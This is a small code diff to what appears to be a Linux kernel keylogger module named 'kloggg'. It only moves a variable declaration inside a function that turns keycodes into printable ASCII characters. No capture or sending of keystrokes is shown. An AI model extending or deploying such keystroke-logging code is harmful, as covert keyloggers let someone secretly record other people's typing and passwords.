@@ -46,6 +46,7 @@ static struct proc_ops kloggg_fops = {
 
 static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
   u_short symbol;
+  char c;
 
   if (keycode >= NR_KEYS)
     return '?'; // Invalid keycode
@@ -56,7 +57,7 @@ static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
     symbol = plain_map[keycode];
   }
 
-  char c = symbol & 0xFF;
+  c = symbol & 0xFF;
 
   // Only return if it's printable ASCII
   if (c >= 32 && c <= 126)
